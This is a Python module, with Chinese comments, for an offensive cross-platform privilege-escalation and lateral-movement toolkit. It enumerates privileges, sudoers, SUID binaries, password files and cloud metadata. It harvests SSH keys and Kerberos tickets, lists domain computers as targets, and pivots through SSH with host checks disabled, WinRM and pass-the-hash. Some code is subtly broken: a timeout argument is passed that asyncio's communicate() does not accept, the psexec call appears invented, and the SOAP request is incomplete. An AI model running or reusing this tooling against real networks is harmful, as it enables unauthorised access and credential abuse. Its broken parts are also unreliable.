"""
Windows/Linux提权辅助套件 - 跨平台融合模块
===================================================
Windows/Linux统一接口、跨平台联动、统一检查命令。

核心能力:
    1. 统一检查命令 - privesc_check自动识别OS，调用对应模块
    2. 统一数据模型 - 多平台结果统一展示
    3. 跨平台利用链 - SSH密钥/Kerberos票据跨平台横向移动

Author: 昆仑安全实验室
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import platform
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# 枚举与数据模型
# =============================================================================

class TargetPlatform(str, Enum):
    """目标平台"""
    WINDOWS = "windows"
    LINUX = "linux"
    UNKNOWN = "unknown"


class CheckCategory(str, Enum):
    """检查类别"""
    USER_INFO = "user_info"
    GROUP_MEMBERSHIP = "group_membership"
    PRIVILEGES = "privileges"
    SERVICES = "services"
    SCHEDULED_TASKS = "scheduled_tasks"
    INSTALLED_PATCHES = "installed_patches"
    SUID_BINARIES = "suid_binaries"
    SUDO_RULES = "sudo_rules"
    CAPABILITIES = "capabilities"
    KERNEL_INFO = "kernel_info"
    CREDENTIALS = "credentials"
    NETWORK = "network"
    CLOUD_METADATA = "cloud_metadata"
    CONTAINER_INFO = "container_info"
    DOMAIN_INFO = "domain_info"


class LateralMovementMethod(str, Enum):
    """横向移动方法"""
    SSH_KEY = "ssh_key"
    KERBEROS_TICKET = "kerberos_ticket"
    PTH = "pass_the_hash"
    PTT = "pass_the_ticket"
    WINRM = "winrm"
    WMI = "wmi"
    RDP = "rdp"
    SMB = "smb"


@dataclass
class PlatformInfo:
    """平台信息

    Attributes:
        platform: 平台类型
        os_name: 操作系统名
        os_version: 操作系统版本
        hostname: 主机名
        username: 用户名
        is_admin: 是否管理员/root
        architecture: 架构
    """
    platform: TargetPlatform = TargetPlatform.UNKNOWN
    os_name: str = ""
    os_version: str = ""
    hostname: str = ""
    username: str = ""
    is_admin: bool = False
    architecture: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "platform": self.platform.value,
            "os_name": self.os_name,
            "os_version": self.os_version,
            "hostname": self.hostname,
            "username": self.username,
            "is_admin": self.is_admin,
            "architecture": self.architecture,
        }


@dataclass
class CheckResult:
    """检查结果

    Attributes:
        category: 检查类别
        platform: 平台类型
        command: 执行命令
        output: 输出
        findings: 发现
        risk_level: 风险等级
        timestamp: 时间戳
    """
    category: CheckCategory = CheckCategory.USER_INFO
    platform: TargetPlatform = TargetPlatform.UNKNOWN
    command: str = ""
    output: str = ""
    findings: List[str] = field(default_factory=list)
    risk_level: str = "low"
    timestamp: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "category": self.category.value,
            "platform": self.platform.value,
            "command": self.command,
            "output": self.output,
            "findings": self.findings,
            "risk_level": self.risk_level,
            "timestamp": self.timestamp,
        }


@dataclass
class CrossPlatformCredential:
    """跨平台凭据

    Attributes:
        credential_type: 凭据类型
        platform: 平台类型
        target_host: 目标主机
        username: 用户名
        credential_data: 凭据数据
        usable: 是否可用
        risk_level: 风险等级
    """
    credential_type: LateralMovementMethod = LateralMovementMethod.SSH_KEY
    platform: TargetPlatform = TargetPlatform.UNKNOWN
    target_host: str = ""
    username: str = ""
    credential_data: str = ""
    usable: bool = False
    risk_level: str = "low"

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "credential_type": self.credential_type.value,
            "platform": self.platform.value,
            "target_host": self.target_host,
            "username": self.username,
            "credential_data": "***REDACTED***",
            "usable": self.usable,
            "risk_level": self.risk_level,
        }


@dataclass
class PrivescCheckReport:
    """提权检查报告

    Attributes:
        report_id: 报告ID
        timestamp: 时间戳
        platform_info: 平台信息
        results: 检查结果
        cross_platform_credentials: 跨平台凭据
        lateral_movement_targets: 横向移动目标
        summary: 摘要
    """
    report_id: str = ""
    timestamp: str = ""
    platform_info: PlatformInfo = field(default_factory=PlatformInfo)
    results: List[CheckResult] = field(default_factory=list)
    cross_platform_credentials: List[CrossPlatformCredential] = field(default_factory=list)
    lateral_movement_targets: List[str] = field(default_factory=list)
    summary: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "report_id": self.report_id,
            "timestamp": self.timestamp,
            "platform_info": self.platform_info.to_dict(),
            "results": [r.to_dict() for r in self.results],
            "cross_platform_credentials": [
                c.to_dict() for c in self.cross_platform_credentials
            ],
            "lateral_movement_targets": self.lateral_movement_targets,
            "summary": self.summary,
        }


# =============================================================================
# 统一命令映射
# =============================================================================

CHECK_COMMANDS_WINDOWS = {
    CheckCategory.USER_INFO: 'whoami /all',
    CheckCategory.GROUP_MEMBERSHIP: 'net user %USERNAME%',
    CheckCategory.PRIVILEGES: 'whoami /priv',
    CheckCategory.SERVICES: 'sc query state= all',
    CheckCategory.SCHEDULED_TASKS: 'schtasks /query /fo LIST',
    CheckCategory.INSTALLED_PATCHES: 'wmic qfe list',
    CheckCategory.CREDENTIALS: 'cmdkey /list',
    CheckCategory.NETWORK: 'ipconfig /all',
    CheckCategory.CLOUD_METADATA: 'powershell -Command "Invoke-RestMethod -Uri http://169.254.169.254/latest/meta-data/"',
    CheckCategory.DOMAIN_INFO: 'nltest /dsgetdc:%USERDOMAIN%',
}

CHECK_COMMANDS_LINUX = {
    CheckCategory.USER_INFO: 'id && whoami',
    CheckCategory.GROUP_MEMBERSHIP: 'groups',
    CheckCategory.PRIVILEGES: 'sudo -l',
    CheckCategory.SERVICES: 'systemctl list-units --type=service',
    CheckCategory.SCHEDULED_TASKS: 'crontab -l && ls -la /etc/cron*',
    CheckCategory.INSTALLED_PATCHES: 'dpkg -l | grep linux-image || rpm -qa | grep kernel',
    CheckCategory.SUID_BINARIES: 'find / -perm -4000 -type f 2>/dev/null',
    CheckCategory.SUDO_RULES: 'cat /etc/sudoers 2>/dev/null && ls -la /etc/sudoers.d/',
    CheckCategory.CAPABILITIES: 'getcap -r / 2>/dev/null',
    CheckCategory.KERNEL_INFO: 'uname -a && cat /proc/version',
    CheckCategory.CREDENTIALS: 'cat /etc/passwd && ls -la ~/.ssh/',
    CheckCategory.NETWORK: 'ip addr && cat /etc/hosts',
    CheckCategory.CLOUD_METADATA: 'curl -s http://169.254.169.254/latest/meta-data/',
    CheckCategory.CONTAINER_INFO: 'cat /proc/1/cgroup && ls -la /.dockerenv 2>/dev/null',
}


class CommandDispatcher:
    """命令分发器

    根据平台自动选择对应命令。

    Attributes:
        _platform: 当前平台
    """

    def __init__(self) -> None:
        """初始化命令分发器"""
        self._platform = self._detect_platform()

    def _detect_platform(self) -> TargetPlatform:
        """检测平台

        Returns:
            平台类型
        """
        system = platform.system().lower()
        if system == "windows":
            return TargetPlatform.WINDOWS
        elif system == "linux":
            return TargetPlatform.LINUX
        return TargetPlatform.UNKNOWN

    def get_command(self, category: CheckCategory) -> str:
        """获取命令

        Args:
            category: 检查类别

        Returns:
            命令字符串
        """
        commands = (
            CHECK_COMMANDS_WINDOWS
            if self._platform == TargetPlatform.WINDOWS
            else CHECK_COMMANDS_LINUX
        )
        return commands.get(category, "")

    def get_platform(self) -> TargetPlatform:
        """获取平台

        Returns:
            平台类型
        """
        return self._platform


# =============================================================================
# 平台信息收集
# =============================================================================

class PlatformInfoCollector:
    """平台信息收集器

    Attributes:
        _is_windows: 是否为Windows
    """

    def __init__(self) -> None:
        """初始化平台信息收集器"""
        self._is_windows = platform.system().lower() == "windows"

    async def collect(self) -> PlatformInfo:
        """收集平台信息

        Returns:
            平台信息
        """
        info = PlatformInfo(
            platform=TargetPlatform.WINDOWS if self._is_windows else TargetPlatform.LINUX,
            os_name=platform.system(),
            os_version=platform.version(),
            hostname=platform.node(),
            username=os.environ.get("USERNAME") or os.environ.get("USER", ""),
            architecture=platform.machine(),
        )

        info.is_admin = await self._check_admin()

        return info

    async def _check_admin(self) -> bool:
        """检查是否管理员

        Returns:
            是否管理员
        """
        try:
            if self._is_windows:
                proc = await asyncio.create_subprocess_shell(
                    'net session 2>&1 | findstr "0x0"',
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
            else:
                proc = await asyncio.create_subprocess_shell(
                    "id -u",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )

            stdout, _ = await proc.communicate()
            output = stdout.decode("utf-8", errors="replace").strip()

            if self._is_windows:
                return "0x0" in output
            else:
                return output == "0"

        except Exception:
            return False


# =============================================================================
# 跨平台凭据发现
# =============================================================================

class CrossPlatformCredentialFinder:
    """跨平台凭据发现器

    发现可用于跨平台横向移动的凭据。

    Attributes:
        _is_windows: 是否为Windows
    """

    def __init__(self) -> None:
        """初始化跨平台凭据发现器"""
        self._is_windows = platform.system().lower() == "windows"

    async def find_all(self) -> List[CrossPlatformCredential]:
        """查找所有跨平台凭据

        Returns:
            凭据列表
        """
        credentials = []

        if self._is_windows:
            credentials.extend(await self._find_windows_credentials())
        else:
            credentials.extend(await self._find_linux_credentials())

        return credentials

    async def _find_windows_credentials(self) -> List[CrossPlatformCredential]:
        """查找Windows凭据

        Returns:
            凭据列表
        """
        credentials = []

        ssh_keys = await self._find_ssh_keys_windows()
        if ssh_keys:
            credentials.append(CrossPlatformCredential(
                credential_type=LateralMovementMethod.SSH_KEY,
                platform=TargetPlatform.WINDOWS,
                target_host="linux_targets",
                username="current_user",
                credential_data=ssh_keys,
                usable=True,
                risk_level="high",
            ))

        kerberos = await self._find_kerberos_tickets()
        if kerberos:
            credentials.append(CrossPlatformCredential(
                credential_type=LateralMovementMethod.KERBEROS_TICKET,
                platform=TargetPlatform.WINDOWS,
                target_host="domain_targets",
                username="current_user",
                credential_data=kerberos,
                usable=True,
                risk_level="critical",
            ))

        return credentials

    async def _find_linux_credentials(self) -> List[CrossPlatformCredential]:
        """查找Linux凭据

        Returns:
            凭据列表
        """
        credentials = []

        ssh_keys = await self._find_ssh_keys_linux()
        if ssh_keys:
            credentials.append(CrossPlatformCredential(
                credential_type=LateralMovementMethod.SSH_KEY,
                platform=TargetPlatform.LINUX,
                target_host="other_targets",
                username="current_user",
                credential_data=ssh_keys,
                usable=True,
                risk_level="high",
            ))

        kerberos = await self._find_kerberos_tickets_linux()
        if kerberos:
            credentials.append(CrossPlatformCredential(
                credential_type=LateralMovementMethod.KERBEROS_TICKET,
                platform=TargetPlatform.LINUX,
                target_host="domain_targets",
                username="current_user",
                credential_data=kerberos,
                usable=True,
                risk_level="critical",
            ))

        return credentials

    async def _find_ssh_keys_windows(self) -> str:
        """查找Windows SSH密钥

        Returns:
            密钥路径
        """
        try:
            proc = await asyncio.create_subprocess_shell(
                'powershell -Command "'
                "Get-ChildItem $env:USERPROFILE\\.ssh -ErrorAction SilentlyContinue | "
                "Select-Object -ExpandProperty FullName"
                '"',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            return stdout.decode("utf-8", errors="replace").strip()
        except Exception:
            return ""

    async def _find_ssh_keys_linux(self) -> str:
        """查找Linux SSH密钥

        Returns:
            密钥路径
        """
        try:
            proc = await asyncio.create_subprocess_shell(
                "ls -la ~/.ssh/ 2>/dev/null",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            return stdout.decode("utf-8", errors="replace").strip()
        except Exception:
            return ""

    async def _find_kerberos_tickets(self) -> str:
        """查找Kerberos票据

        Returns:
            票据信息
        """
        try:
            proc = await asyncio.create_subprocess_shell(
                'powershell -Command "'
                "klist tickets 2>&1"
                '"',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            return stdout.decode("utf-8", errors="replace").strip()
        except Exception:
            return ""

    async def _find_kerberos_tickets_linux(self) -> str:
        """查找Linux Kerberos票据

        Returns:
            票据信息
        """
        try:
            proc = await asyncio.create_subprocess_shell(
                "klist 2>/dev/null",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            return stdout.decode("utf-8", errors="replace").strip()
        except Exception:
            return ""


# =============================================================================
# 跨平台横向移动
# =============================================================================

class CrossPlatformLateralMover:
    """跨平台横向移动器

    利用跨平台凭据自动发起横向移动。

    Attributes:
        _is_windows: 是否为Windows
    """

    def __init__(self) -> None:
        """初始化跨平台横向移动器"""
        self._is_windows = platform.system().lower() == "windows"

    async def move_with_ssh_key(
        self,
        target_host: str,
        username: str,
        key_path: str,
    ) -> bool:
        """使用SSH密钥横向移动

        Args:
            target_host: 目标主机
            username: 用户名
            key_path: 密钥路径

        Returns:
            是否成功
        """
        try:
            cmd = (
                f"ssh -i {key_path} -o StrictHostKeyChecking=no "
                f"{username}@{target_host} 'id && whoami'"
            )

            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            _, _ = await proc.communicate(timeout=30)

            return proc.returncode == 0

        except Exception as e:
            logger.debug(f"SSH横向移动失败: {e}")
            return False

    async def move_with_kerberos(
        self,
        target_host: str,
        service: str = "cifs",
    ) -> bool:
        """使用Kerberos票据横向移动

        Args:
            target_host: 目标主机
            service: 服务名

        Returns:
            是否成功
        """
        try:
            if self._is_windows:
                cmd = (
                    f"powershell -Command '"
                    f"Invoke-Command -ComputerName {target_host} "
                    f"-ScriptBlock {{ whoami }}"
                    f"'"
                )
            else:
                cmd = (
                    f"curl -k https://{target_host}:5986/wsman "
                    f"--negotiate -u : "
                    f"-d '<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\">' "
                    f"--header 'Content-Type: application/soap+xml'"
                )

            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            _, _ = await proc.communicate(timeout=30)

            return proc.returncode == 0

        except Exception as e:
            logger.debug(f"Kerberos横向移动失败: {e}")
            return False

    async def move_with_pth(
        self,
        target_host: str,
        username: str,
        ntlm_hash: str,
    ) -> bool:
        """使用Pass-the-Hash横向移动

        Args:
            target_host: 目标主机
            username: 用户名
            ntlm_hash: NTLM哈希

        Returns:
            是否成功
        """
        try:
            cmd = (
                f"python3 -c '"
                f"from psexec import PSEXEC; "
                f"p = PSEXEC(); "
                f"p.run(\"{target_host}\", \"{username}\", \"{ntlm_hash}\")"
                f"'"
            )

            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            _, _ = await proc.communicate(timeout=60)

            return proc.returncode == 0

        except Exception as e:
            logger.debug(f"PTH横向移动失败: {e}")
            return False


# =============================================================================
# 统一检查执行器
# =============================================================================

class UnifiedCheckExecutor:
    """统一检查执行器

    执行privesc_check命令，自动识别平台并调用对应模块。

    Attributes:
        _dispatcher: 命令分发器
        _info_collector: 平台信息收集器
        _credential_finder: 跨平台凭据发现器
        _lateral_mover: 跨平台横向移动器
    """

    def __init__(self) -> None:
        """初始化统一检查执行器"""
        self._dispatcher = CommandDispatcher()
        self._info_collector = PlatformInfoCollector()
        self._credential_finder = CrossPlatformCredentialFinder()
        self._lateral_mover = CrossPlatformLateralMover()

    async def privesc_check(
        self,
        categories: Optional[List[CheckCategory]] = None,
    ) -> PrivescCheckReport:
        """执行提权检查

        Args:
            categories: 检查类别列表

        Returns:
            提权检查报告
        """
        report = PrivescCheckReport(
            report_id=f"check_{int(time.time())}",
            timestamp=datetime.now().isoformat(),
        )

        report.platform_info = await self._info_collector.collect()

        cats = categories or list(CheckCategory)
        for category in cats:
            result = await self._execute_check(category)
            report.results.append(result)

        report.cross_platform_credentials = await self._credential_finder.find_all()

        report.lateral_movement_targets = await self._discover_targets()

        report.summary = self._generate_summary(report)

        return report

    async def _execute_check(self, category: CheckCategory) -> CheckResult:
        """执行单个检查

        Args:
            category: 检查类别

        Returns:
            检查结果
        """
        command = self._dispatcher.get_command(category)
        platform = self._dispatcher.get_platform()

        result = CheckResult(
            category=category,
            platform=platform,
            command=command,
            timestamp=datetime.now().isoformat(),
        )

        if not command:
            result.output = "不支持的检查类别"
            return result

        try:
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate(timeout=30)

            result.output = stdout.decode("utf-8", errors="replace")
            result.findings = self._parse_findings(category, result.output)
            result.risk_level = self._assess_risk(category, result.findings)

        except Exception as e:
            result.output = f"执行失败: {e}"

        return result

    def _parse_findings(
        self, category: CheckCategory, output: str,
    ) -> List[str]:
        """解析发现

        Args:
            category: 检查类别
            output: 输出

        Returns:
            发现列表
        """
        findings = []

        if category == CheckCategory.USER_INFO:
            if "SeDebugPrivilege" in output:
                findings.append("拥有Debug权限")
            if "SeImpersonatePrivilege" in output:
                findings.append("拥有SeImpersonatePrivilege")

        elif category == CheckCategory.PRIVILEGES:
            if "Enabled" in output:
                findings.append("存在已启用的特权")

        elif category == CheckCategory.SUID_BINARIES:
            lines = output.strip().split("\n")
            if len(lines) > 0 and lines[0]:
                findings.append(f"发现 {len(lines)} 个SUID二进制文件")

        elif category == CheckCategory.SUDO_RULES:
            if "NOPASSWD" in output:
                findings.append("存在NOPASSWD sudo规则")

        elif category == CheckCategory.CAPABILITIES:
            lines = output.strip().split("\n")
            if len(lines) > 0 and lines[0]:
                findings.append(f"发现 {len(lines)} 个capabilities")

        elif category == CheckCategory.KERNEL_INFO:
            findings.append(f"内核信息: {output.strip()[:100]}")

        return findings

    def _assess_risk(
        self, category: CheckCategory, findings: List[str],
    ) -> str:
        """评估风险

        Args:
            category: 检查类别
            findings: 发现

        Returns:
            风险等级
        """
        if not findings:
            return "low"

        high_risk_keywords = [
            "SeDebugPrivilege", "SeImpersonatePrivilege",
            "NOPASSWD", "root", "SYSTEM",
        ]

        for finding in findings:
            for keyword in high_risk_keywords:
                if keyword in finding:
                    return "high"

        return "medium"

    async def _discover_targets(self) -> List[str]:
        """发现横向移动目标

        Returns:
            目标列表
        """
        targets = []

        try:
            if self._dispatcher.get_platform() == TargetPlatform.WINDOWS:
                proc = await asyncio.create_subprocess_shell(
                    'powershell -Command "'
                    "Get-ADComputer -Filter * | "
                    "Select-Object -ExpandProperty Name"
                    '"',
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
            else:
                proc = await asyncio.create_subprocess_shell(
                    "cat /etc/hosts | grep -v '^#' | awk '{print $2}'",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )

            stdout, _ = await proc.communicate()
            output = stdout.decode("utf-8", errors="replace").strip()

            if output:
                targets = output.split("\n")

        except Exception:
            pass

        return targets

    def _generate_summary(self, report: PrivescCheckReport) -> Dict[str, Any]:
        """生成摘要

        Args:
            report: 提权检查报告

        Returns:
            摘要
        """
        high_risk = sum(
            1 for r in report.results if r.risk_level == "high"
        )
        medium_risk = sum(
            1 for r in report.results if r.risk_level == "medium"
        )

        return {
            "total_checks": len(report.results),
            "high_risk_findings": high_risk,
            "medium_risk_findings": medium_risk,
            "cross_platform_credentials": len(report.cross_platform_credentials),
            "lateral_movement_targets": len(report.lateral_movement_targets),
            "platform": report.platform_info.platform.value,
            "is_admin": report.platform_info.is_admin,
        }


# =============================================================================
# 主跨平台模块
# =============================================================================

class PrivescCrossPlatformModule:
    """跨平台融合模块

    整合统一检查命令、跨平台凭据发现、横向移动。

    Attributes:
        _executor: 统一检查执行器
        _info_collector: 平台信息收集器
        _credential_finder: 跨平台凭据发现器
        _lateral_mover: 跨平台横向移动器
    """

    def __init__(self) -> None:
        """初始化跨平台模块"""
        self._executor = UnifiedCheckExecutor()
        self._info_collector = PlatformInfoCollector()
        self._credential_finder = CrossPlatformCredentialFinder()
        self._lateral_mover = CrossPlatformLateralMover()

    async def privesc_check(
        self,
        categories: Optional[List[CheckCategory]] = None,
    ) -> PrivescCheckReport:
        """执行提权检查（统一入口）

        Args:
            categories: 检查类别列表

        Returns:
            提权检查报告
        """
        return await self._executor.privesc_check(categories)

    async def get_platform_info(self) -> PlatformInfo:
        """获取平台信息

        Returns:
            平台信息
        """
        return await self._info_collector.collect()

    async def find_cross_platform_credentials(self) -> List[CrossPlatformCredential]:
        """查找跨平台凭据

        Returns:
            凭据列表
        """
        return await self._credential_finder.find_all()

    async def lateral_move_with_ssh(
        self,
        target_host: str,
        username: str,
        key_path: str,
    ) -> bool:
        """SSH横向移动

        Args:
            target_host: 目标主机
            username: 用户名
            key_path: 密钥路径

        Returns:
            是否成功
        """
        return await self._lateral_mover.move_with_ssh_key(
            target_host, username, key_path,
        )

    async def lateral_move_with_kerberos(
        self,
        target_host: str,
        service: str = "cifs",
    ) -> bool:
        """Kerberos横向移动

        Args:
            target_host: 目标主机
            service: 服务名

        Returns:
            是否成功
        """
        return await self._lateral_mover.move_with_kerberos(
            target_host, service,
        )

    async def lateral_move_with_pth(
        self,
        target_host: str,
        username: str,
        ntlm_hash: str,
    ) -> bool:
        """Pass-the-Hash横向移动

        Args:
            target_host: 目标主机
            username: 用户名
            ntlm_hash: NTLM哈希

        Returns:
            是否成功
        """
        return await self._lateral_mover.move_with_pth(
            target_host, username, ntlm_hash,
        )


# =============================================================================
# 全局单例
# =============================================================================

_cross_platform_module: Optional[PrivescCrossPlatformModule] = None


def get_cross_platform_module() -> PrivescCrossPlatformModule:
    """获取跨平台模块全局单例

    Returns:
        PrivescCrossPlatformModule 实例
    """
    global _cross_platform_module
    if _cross_platform_module is None:
        _cross_platform_module = PrivescCrossPlatformModule()
    return _cross_platform_module


__all__ = [
    "PrivescCrossPlatformModule",
    "UnifiedCheckExecutor",
    "CommandDispatcher",
    "PlatformInfoCollector",
    "CrossPlatformCredentialFinder",
    "CrossPlatformLateralMover",
    "PlatformInfo",
    "CheckResult",
    "CrossPlatformCredential",
    "PrivescCheckReport",
    "TargetPlatform",
    "CheckCategory",
    "LateralMovementMethod",
    "CHECK_COMMANDS_WINDOWS",
    "CHECK_COMMANDS_LINUX",
    "get_cross_platform_module",
]
